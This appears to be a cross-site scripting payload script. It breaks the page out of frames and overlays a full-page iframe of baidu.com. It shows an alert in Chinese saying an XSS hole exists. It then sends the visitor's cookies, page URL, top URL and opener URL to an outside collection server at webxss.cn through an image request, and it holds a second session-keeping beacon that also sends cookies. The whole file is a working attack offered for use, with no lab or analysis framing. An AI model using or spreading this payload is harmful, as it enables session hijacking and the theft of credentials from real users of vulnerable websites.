if (top.location != self.location){top.location = self.location;}
var iframe = document.createElement('iframe');
iframe.width="100%";
iframe.height="100%";
iframe.frameborder=0;
iframe.scrolling="no";
iframe.style="position:absolute;left:0;top:0"
iframe.src = 'https://www.baidu.com/';
document.body.insertBefore(iframe, document.body.firstChild);
(function(){alert(/存在XSS漏洞/);(new Image()).src='http://webxss.cn/index.php?do=api&id=sZLz8s&location='+escape((function(){try{return document.location.href}catch(e){return''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return''}})())+'&opener='+escape((function(){try{return(window.opener&&window.opener.location.href)?window.opener.location.href:''}catch(e){return''}})())})();if(''==1){keep=new Image();keep.src='http://webxss.cn/index.php?do=keepsession&id=sZLz8s&url='+escape(document.location)+'&cookie='+escape(document.cookie)};
